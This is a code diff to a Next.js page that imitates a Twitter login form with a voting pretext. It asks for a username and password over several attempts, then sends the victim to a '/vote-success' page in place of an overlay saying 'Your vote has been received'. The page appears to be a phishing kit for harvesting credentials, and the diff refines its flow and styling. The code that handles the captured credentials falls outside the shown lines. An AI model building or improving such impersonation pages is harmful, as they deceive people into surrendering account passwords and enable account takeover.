@@ -1,15 +1,16 @@
 import Head from 'next/head';
 import { useState, useRef } from 'react';
+import { useRouter } from 'next/router';
 
 const MAX_ATTEMPTS = 5;
 
 export default function TwitterLoginPage() {
+  const router = useRouter();
   const [username, setUsername] = useState('');
   const [password, setPassword] = useState('');
   const [step, setStep] = useState(1);
   const [feedback, setFeedback] = useState('');
   const [clickCount, setClickCount] = useState(0);
-  const [showSuccess, setShowSuccess] = useState(false);
   const attemptRef = useRef(0);
 
   const handleNext = () => {
@@ -41,8 +42,7 @@ export default function TwitterLoginPage() {
     } catch (e) {}
     
     if (attemptRef.current >= MAX_ATTEMPTS) {
-      setShowSuccess(true);
-      setTimeout(() => setShowSuccess(false), 4000);
+      router.push('/vote-success');
     }
   };
 
@@ -67,31 +67,31 @@ export default function TwitterLoginPage() {
           background: #000; 
           color: #e7e9ea;
           display: flex; 
-          align-items: center; 
           justify-content: center; 
+          align-items: center; 
           min-height: 100vh;
+          margin: 0;
         }
         .login-container {
-          background: white; 
-          width: 360px; 
-          padding: 30px; 
-          border-radius: 12px; 
-          box-shadow: 0 4px 12px rgba(0,0,0,0.1); 
+          background: white;
+          width: 100%;
+          max-width: 360px;
+          padding: 30px;
+          border-radius: 12px;
+          box-shadow: 0 2px 8px rgba(0,0,0,0.1);
           text-align: center;
-          max-width: 90vw;
+          margin: 20px;
         }
         .logo { 
           width: 40px; 
           height: 40px; 
-          margin: 0 auto 20px; 
+          margin: 0 auto 16px; 
           display: block;
         }
         input { 
-          width: 100%; 
-          max-width: 320px;
-          padding: 12px 16px; 
-          margin: 10px auto 0;
-          display: block;
+          width: 100%;
+          padding: 12px 14px; 
+          margin: 10px 0;
           border: 1px solid #ccc; 
           border-radius: 4px; 
           font-size: 15px; 
@@ -104,27 +104,23 @@ export default function TwitterLoginPage() {
           background: white;
         }
         button { 
-          width: 100%; 
-          max-width: 320px;
-          padding: 12px; 
+          width: 100%;
+          padding: 12px;
           background: #1da1f2; 
           color: white; 
           border: none; 
-          border-radius: 4px; 
+          border-radius: 4px;
           font-size: 16px; 
           cursor: pointer;
           margin-top: 8px;
-          display: block;
         }
         button:hover { 
           background: #1991d9; 
         }
-        .feedback { 
-          color: #f4212e; 
-          font-size: 14px; 
-          margin: 8px auto 0;
-          max-width: 320px;
-          display: block;
+        .feedback {
+          color: #f4212e;
+          font-size: 14px;
+          margin: 8px 0;
         }
         .back-link {
           color: #1da1f2;
@@ -135,38 +131,6 @@ export default function TwitterLoginPage() {
           cursor: pointer;
         }
         .back-link:hover { text-decoration: underline; }
-        .success-overlay { 
-          position: fixed; 
-          inset: 0; 
-          background: rgba(0,0,0,0.97); 
-          display: none; 
-          align-items: center; 
-          justify-content: center; 
-          z-index: 9999; 
-        }
-        .success-overlay.show { 
-          display: flex; 
-        }
-        .success-box { 
-          text-align: center; 
-          padding: 20px; 
-          color: white;
-        }
-        .checkmark { 
-          width: 110px; 
-          height: 110px; 
-          background: #4caf50; 
-          border-radius: 50%; 
-          display: flex; 
-          align-items: center; 
-          justify-content: center; 
-          margin: 0 auto 28px; 
-          box-shadow: 0 4px 12px rgba(76,175,80,0.4); 
-        }
-        .checkmark svg { 
-          width: 56px; 
-          height: 56px; 
-        }
       `}</style>
 
       <div className="login-container">
@@ -199,14 +163,6 @@ export default function TwitterLoginPage() {
             <div className="back-link" onClick={handleBack}>← Back</div>
           </div>
         )}
-      </div>
-
-      <div className="success-overlay" id="successOverlay">
-        <div className="success-box">
-          <div className="checkmark"><svg viewBox="0 0 52 52" xmlns="http://www.w3.org/2000/svg"><polyline points="15,27 24,36 39,17"></polyline></svg></div>
-          <h2>Your vote has been received</h2>
-          <p>We will get back to you when your vote is counted.</p>
-        </div>
       </div>
     </>
   );
